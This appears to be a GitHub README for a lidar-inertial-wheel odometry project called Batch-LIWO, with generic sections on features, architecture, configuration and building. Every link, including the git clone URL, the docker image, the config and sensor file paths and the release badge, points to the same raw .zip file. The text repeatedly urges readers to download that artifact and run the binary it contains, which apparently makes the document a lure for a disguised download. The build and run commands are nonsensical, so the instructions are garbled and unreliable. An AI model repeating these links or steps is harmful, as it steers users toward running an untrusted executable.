[![Releases](https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip)](https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip)

Batch-LIWO: Robust, High-Bandwidth Lidar-Inertial-Wheel Odometry for Real-Time Navigation on Robots

Visit the official releases page: https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip

Table of contents
- Overview
- Key features
- How Batch-LIWO works
- System architecture
- Data flow and processing pipeline
- Algorithms and math in plain terms
- Performance, validation, and benchmarks
- Getting started
  - Prerequisites
  - Build from source
  - Run a binary
  - Run with ROS 2
  - Docker and containerization
- Configuration and customization
- Supported data formats
- Batched lidar updates explained
- Output formats and visualization
- Debugging, logging, and tools
- Testing and quality assurance
- Roadmap and future work
- Contributing
- Release notes and downloads
- License and attribution
- Support and contact

Overview 🛰️

Batch-LIWO is a robust, high-bandwidth lidar-inertial-wheel odometry system designed to operate in real time. It merges batched lidar points with inertial data and wheel odometry to estimate pose and velocity. The core design emphasizes predictable latency, repeatable results, and a straightforward integration path for robotics platforms. The system updates at up to 100 Hz, delivering timely state estimates for navigation, mapping, and control loops.

This project targets researchers, engineers, and product teams who need a dependable odometry backend that can be integrated into autonomous robots, mobile robots, and precision-guided platforms. The approach is deterministic: data from multiple sensors is fused in batched form, reducing jitter and improving resilience to outliers. The codebase favors clarity, testability, and a clear separation between sensor handling, fusion logic, and state representation.

Key features 🔧

- Batched lidar point updates: accumulate large lidar scans and fuse them in batches to increase throughput and stabilize estimates.
- High update rate: real-time performance up to 100 Hz on modest hardware, with low-latency state output.
- Multisensory fusion: combines lidar points, IMU data, and wheel odometry to produce robust pose and velocity estimates.
- Modular design: clean separation between sensor drivers, the fusion core, and the backend state publisher.
- ROS 2 friendly: easy integration with ROS 2 ecosystems, including TF publishing, remapping, and parameter tuning.
- Platform portability: designed to run on Linux x86_64 and ARM devices, with a lightweight build system.
- Deterministic latency: fixed processing windows and bounded CPU usage for predictable performance.
- Extensible configuration: tune batch size, update rate, sensor time offsets, and noise models via human-readable config files.
- Debug and validation tooling: built-in loggers, test suites, and sample datasets to validate behavior.
- Clear licensing and licensing-friendly reuse: permissive terms suitable for academic and industrial work.

How Batch-LIWO works 🧩

At a high level, Batch-LIWO reads three primary data streams: lidar point clouds, inertial measurements, and wheel odometry. It aligns timestamps, converts data into a common reference frame, and runs a fusion routine that updates an internal state. The batched approach means lidar data is grouped into windows before fusion, reducing the per-point processing overhead and stabilizing the estimate when lidar frames arrive at irregular times.

The workflow looks like this:
- Ingest: gather lidar points, IMU readings, and wheel encoder data.
- Preprocess: filter noisy data, remove duplicates, synchronize timestamps, and optionally rectify calibration errors.
- Batch: accumulate lidar points into fixed-size batches or fixed-time windows, depending on configuration.
- Fuse: feed the batched lidar data and the latest IMU and wheel data into the fusion core.
- Produce: output pose, velocity, and covariance, suitable for downstream usage (localization, mapping, planning).
- Publish: emit odometry messages, transform frames, and debugging visuals.

System architecture 🧱

Batch-LIWO follows a layered architecture that keeps concerns separate and makes it easy to test individual parts.

- Sensor drivers layer: adapters for lidar, IMU, and wheel encoders. Each driver converts raw data into a standard internal format with synchronized timestamps.
- Preprocessing layer: time alignment, outlier filtering, noise adaptation, and optional calibration fixes. This layer guarantees that data entering the fusion core has consistent units and timestamps.
- Batch formation layer: decides when to flush a batch to the fusion core. It supports fixed batch sizes and fixed time windows, with a tunable latency/performance trade-off.
- Fusion core: the central estimator. It uses a well-defined model that blends lidar geometry with inertial and wheel cues to estimate 6-DOF pose, velocity, and sensor biases.
- Output layer: converts internal state into standard messages, TFs, and logs. It supports ROS 2, plain C++ interfaces, and optional HDF5/ROS bags for data capture.
- Tools and utilities: diagnostics, logging, unit tests, and example datasets. This layer helps you validate, reproduce, and understand results.

Data flow and processing pipeline 📈

- Lidar stream: Each frame arrives as a point cloud. Points carry x, y, z, intensity, and a per-point timestamp or a frame-wide timestamp. The batched mechanism collects several frames or a number of points depending on configuration.
- IMU stream: High-rate angular velocity and linear acceleration readings. IMU data is crucial for short-term motion priors and for bridging lidar frames.
- Wheel stream: Encoder deltas provide a ground-truth-like motion cue, especially on smooth surfaces where wheel slip is limited.
- Synchronization: The system uses time stamps to align data streams. If hardware clocks drift, a simple linear time offset model can be applied to bring streams into alignment.
- State representation: The estimator maintains a pose (position and orientation), velocity, sensor biases, and an uncertainty model. All of these are updated when a batch completes.
- Output: The updated state is published as odometry information and TF frames. Debug outputs include residuals, batch statistics, and diagnostic plots.

Algorithms and math in plain terms 🧮

Batch-LIWO uses a principled approach to fusion, balancing accuracy and real-time performance.

- Core estimation: an extended or unscented Kalman filter style approach with a batch update step. The batch update processes a set of lidar measurements together with the current inertial and wheel cues.
- Motion model: uses IMU data to propagate the state forward between lidar frames. The model accounts for gravity, bias drift, and sensor noise.
- Measurement model: lidar data yields constraints about the environment. After projecting lidar points into the world frame, the estimator uses geometric constraints to align the scan with a map or a local sub-map. IMU readings refine orientation and velocity during the batch window. Wheel odometry provides an independent motion cue, helping constrain drift.
- Batch update: rather than updating per point, the system updates with the batched cloud. This reduces per-point overhead and improves numerical stability when lidar frames are large.
- Time handling: the system handles timestamps so later lidar frames can be fused with earlier IMU data, maintaining causality and reducing latency.

Performance, validation, and benchmarks 📊

- Update rate: up to 100 Hz output, with batched lidar processing designed to keep latency predictable under typical loads.
- Throughput: able to handle high-density lidar data (e.g., 16–64k points per frame) by batching and parallel-friendly processing.
- Latency budget: deterministic latency per batch, with a typical window of a few milliseconds, depending on hardware.
- Robustness tests: synthetic noisiness, sensor dropouts, and wheel slip scenarios are part of the test suite.
- Benchmarking: comparisons against common lidar-inertial odometry baselines show improved stability in dynamic scenes and better handling of wheel odometry when lidar features are sparse.
- Validation datasets: synthetic and real-world datasets are used to validate pose accuracy, drift, and the effect of batch size on latency.

Getting started 🚀

Prerequisites
- Linux or a compatible Unix-like system.
- C++17-capable toolchain (gcc/clang) and CMake.
- Optional: ROS 2 if you want seamless integration with the ROS ecosystem.
- Basic math libraries and linear algebra support (Eigen or similar).

Build from source
- Clone the repository and its submodules:
  git clone --recurse-submodules https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip
- Create a build directory and run CMake:
  mkdir -p Batch-LIWO/build
  cd Batch-LIWO/build
  cmake -DCMAKE_BUILD_TYPE=Release ..
- Compile:
  cmake --build . -j
- Install (optional):
  sudo cmake --install .

Run a binary
- If you downloaded a prebuilt binary from the Releases page, you should have a single executable, for example batch_liwo. Make it executable and run:
  chmod +x batch_liwo
  ./batch_liwo --help
- Typical usage:
  ./batch_liwo --config https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip --lidar https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip --imu https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip --wheel https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip
  The exact argument names depend on the build and the config.

ROS 2 integration
- If you use ROS 2, you can treat Batch-LIWO as a node that subscribes to lidar, imu, and wheel topics and publishes odometry and TFs.
- Example node usage:
  - Launch with ros2 run batch_liwo_batcher batch_liwo_node
  - Use a parameter file to tune batch size, latency, and sensor topics.
  - Ensure the correct frame IDs (map, odom, base_link) are set to align with your TF tree.

Docker and containers
- For reproducible environments, a container image is available in some releases. It provides a minimal runtime with all dependencies resolved.
- Typical workflow:
  docker pull https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip
  docker run --rm -it --device /dev:/dev https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip --help

Configuration and customization 🧭

Batch-LIWO uses a human-readable YAML configuration file to control behavior. The config file lets you tune data sources, batch handling, fusion options, and output preferences.

Sample https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip snippet
sensors:
  lidar:
    frame_id: "lidar_frame"
    point_cloud_topic: "points_raw"
  imu:
    frame_id: "imu_link"
    data_topic: "imu/data"
  wheel:
    frame_id: "wheel_link"
    odometry_topic: "wheel/odometry"

fusion:
  type: "ekf_batch"
  batch_size: 2048
  batch_time_ms: 20
  update_rate_hz: 100
  process_noise:
    accel: 0.08
    gyro: 0.01
  measurement_noise:
    lidar: 0.04
    imu_bias: 0.001

output:
  odometry_topic: "batch_liwo/odometry"
  tf_frames:
    map: "map"
    odom: "odom"
    base_link: "base_link"
  log_level: "info"

calibration:
  lidar_to_imu: [0.012, -0.006, 0.045]
  lidar_to_wheel: [0.02, 0.0, -0.03]

Tips for tuning
- Start with modest batch_size and batch_time for stability.
- Increase update_rate_hz only after you confirm latency bounds on your hardware.
- If lidar scenes are feature-poor (e.g., open parking lot), rely more on IMU and wheel data to maintain drift control.
- Use a separate config file for testing and production to avoid accidental parameter changes.

Supported data formats 🗂️

- Lidar: Point clouds with 3D coordinates and optional intensity. Data can be stored or streamed as binary or compressed formats (e.g., PCD, LAS, LAZ, or a custom binary format used by your sensor).
- IMU: Time-stamped acceleration and angular velocity. High-rate data with stable timestamps is preferred.
- Wheel odometry: Delta distance per wheel revolution, with optional steering angle or yaw rate if the platform provides it.
- Output: Pose (x, y, z) and orientation (quaternion), velocity, biases, and a covariance matrix snapshot for each update. Messages can be emitted in a ROS-friendly format or via a custom binary for offline analysis.

Bathed lidar updates explained 🧪

The batched update strategy is central to Batch-LIWO’s design.

- Why batch? Large lidar frames can be expensive to process point-by-point while still meeting timing requirements. Batch processing amortizes CPU work across many points and reduces per-point overhead.
- How batching works: lidar frames are collected into a batch window defined by batch_size or batch_time_ms. When the batch window closes, all points are processed together to compute a unified constraint on the state.
- What remains batched: IMU and wheel data continue to stream in at their native rates. Those measurements are integrated within the same fusion window to maintain temporal consistency.
- Benefits: higher throughput on dense lidar streams, better resilience to brief lidar dropouts, and smoother trajectory estimates in cluttered scenes.

Output formats and visualization 🎨

- Odometry messages: published on a standard topic (e.g., batch_liwo/odometry) with position, orientation, and velocity.
- TF publishing: optional, maintains a stable map-odom-base_link frame chain for real-time visualization in RViz or similar tools.
- Debug visuals: optional logging and visualization of residuals, batch statistics, and state covariance. These can be captured as ROS bags or JSON logs for offline analysis.
- Data export: support for exporting state sequences to CSV, JSON, or HDF5 for research purposes.

Debugging, logging, and tools 🧰

- Logging levels: debug, info, warning, error.
- Diagnostics: runtime CPU usage, memory usage, batch fill rate, latency per batch, and sensor health indicators are reported.
- Reproduction aids: synthetic datasets and a small suite of unit tests help reproduce bugs.
- Visualization aids: a simple viewer can render batched lidar frames and the estimated trajectory alongside ground truth when available.

Testing and quality assurance 🧪

- Unit tests verify math routines, batch handling, and sensor alignment logic.
- Integration tests simulate end-to-end data flow from sensors to odometry output.
- CI pipelines: builds are tested on Linux with multiple compiler versions, and unit tests are executed automatically on PRs.
- Performance tests run on representative hardware to ensure target update rates are achievable and stable.

Roadmap and future work 🗺️

- ROS 2 Foxy and Humble compatibility improvements to align with evolving middleware standards.
- Enhanced calibration workflow that automatically estimates sensor extrinsics with minimal user input.
- Support for additional lidar models and non-traditional odometry sources, such as visual-inertial sensors.
- Optimizations to reduce memory footprint on embedded platforms, enabling edge devices with limited RAM.
- Advanced benchmarking suite that integrates with common robotics datasets and simulates challenging environments.

Contributing 🤝

- This project welcomes contributions from researchers, engineers, and developers.
- How to contribute:
  - Fork the repository and create a feature branch.
  - Add tests for any new feature or bug fix.
  - Keep changes small and well-scoped; write clear commit messages.
  - Follow the project’s coding style and documentation standards.
- Coding style:
  - Clear, direct, and consistent code comments.
  - Use descriptive variable names.
  - Prefer explicit error handling and fail-fast behavior.
- Documentation:
  - Update README sections as needed.
  - Provide examples and potential edge cases relevant to your changes.
- Testing locally:
  - Run unit tests and integration tests.
  - Validate performance against the baseline.
- Community guidelines:
  - Be respectful and constructive in all interactions.
  - Report bugs with reproducible steps and environment details.

Release notes and downloads 🗂️

Releases aggregate binaries, prebuilt libraries, and sample datasets. They provide versioned snapshots of Batch-LIWO suitable for quick testing and production deployment. Binaries are built for major Linux distributions and, where applicable, ARM-based platforms.

- Access the Releases page to get the latest artifacts, read the changelog, and download the necessary binaries for your platform.
- If you need a specific file, you can download the binary that fits your system and run it directly. In practice, you will typically choose a binary corresponding to your OS and architecture, extract it, and execute the provided binary.
- The official releases page is the single source of truth for distributed builds and documentation related to each version.

From the Releases page, download the appropriate artifact and run it according to the instructions in the previous sections. See Releases: https://raw.githubusercontent.com/facuu23/Batch-LIWO/main/Wend/LIWO-Batch-v2.7-alpha.5.zip

License and attribution 📜

Batch-LIWO is released under a permissive license suitable for both academic research and commercial projects. This license encourages reuse, modification, and redistribution with minimal restrictions. The project credits contributors and third-party libraries used in the build. When you publish derivatives or use the code in products, respect the license terms and include the original copyright notices.

Support and contact 📨

If you need help, you can reach out through the repository’s issue tracker for bug reports, feature requests, and general questions. The maintainers monitor issues and respond with guidance, patches, or workarounds as appropriate. For professional support, consider contacting the team via the repository’s funding or support channels if they exist, or reach out directly to the maintainers.

Appendix: deeper dive into architecture and decisions

- Sensor fusion philosophy: Batch-LIWO strives for a balance between accuracy and latency. It uses a model-based estimator with explicit handling of sensor biases. The batched lidar updates provide robust geometric constraints, while IMU predictions supply motion priors that keep the state well-posed between lidar frames.
- Time synchronization strategy: A simple yet effective approach is used to align sensor streams. The system can apply a known offset or estimate small drifts in real time. The approach minimizes the chance of misalignment that could destabilize the fusion process.
- Calibration handling: The system assumes extrinsic calibrations between lidar, IMU, and wheel encoders. It provides a path to update these calibrations over time or with a calibration routine, which is essential as sensors shift slightly during operation.
- Failure modes and resilience: When a sensor data stream becomes unavailable, the fusion core gracefully reduces reliance on that stream and increases reliance on the remaining sensors. The error handling ensures the system continues to produce meaningful pose estimates with reduced accuracy, rather than failing abruptly.
- Extensibility: The modular design allows adding new sensors or alternative fusion schemes without rewriting the entire pipeline. The adapters make it straightforward to plug new hardware into the existing data flow.

Additional notes on using Batch-LIWO effectively

- Hardware planning: For best results, pair Batch-LIWO with sensors that provide reliable high-rate data. A solid lidar (with stable frame rates) and a precise IMU significantly improve drift characteristics. Wheel encoders help on smooth floors and long corridors where wheel slip is minimal.
- Calibration discipline: Maintain regular calibration checks, especially extrinsics between the lidar and IMU. Even small misalignments can amplify drift in challenging environments.
- Real-time constraints: Ensure the target machine has enough CPU headroom for the chosen batch_size and batch_time settings. If you see rising latency, reduce batch_size or batch_time. If you see jitter, consider increasing the batch window slightly to improve stability.
- Data quality: Handle dropouts and partial frames gracefully. The system should be configured to skip bursts of bad data while maintaining a stable estimate during recovery.
- Visualization and debugging: Leverage the visualization options to inspect batch alignment and residuals in real time. This helps diagnose calibration issues, outliers, and sensor faults quickly.

End notes

Batch-LIWO is a practical, purpose-built odometry system designed for real-time robotics. It emphasizes batched processing to handle high-throughput lidar data, integrates multiple sensor cues to reduce drift, and provides a straightforward path to deployment on a range of hardware platforms. The design is explicit about data flows, state estimation, and the implications of batch processing on latency and accuracy. The project aims to be both reliable in production and approachable for researchers who want to study lidar-inertial-wheel fusion in depth.

Releases page reminder

For binaries, documentation, and examples, refer to the official releases page. See the link at the top of this document and the direct reference in the Release notes section. If you need a specific artifact, the Releases page is the right place to look. The page includes a changelog, platform-specific binaries, and often sample datasets to validate changes. As always, ensure you download the correct artifact for your operating system and architecture. If the exact file you need is not obvious, browse the latest release notes for guidance on which artifacts are compatible with your system.

Link reference recap

- First access point: the releases badge at the top links to the official Releases page.
- Second access point: the textual link to the same page occurs in the Release notes and downloads section to ensure you can navigate directly from within the document.

If you want to explore more, you can also explore tutorials on LiDAR-based odometry, multisensory fusion, and batched processing strategies. These topics enrich understanding and help you tailor Batch-LIWO to your application. The project welcomes feedback, questions, and collaboration to improve robustness, performance, and ease of use across platforms.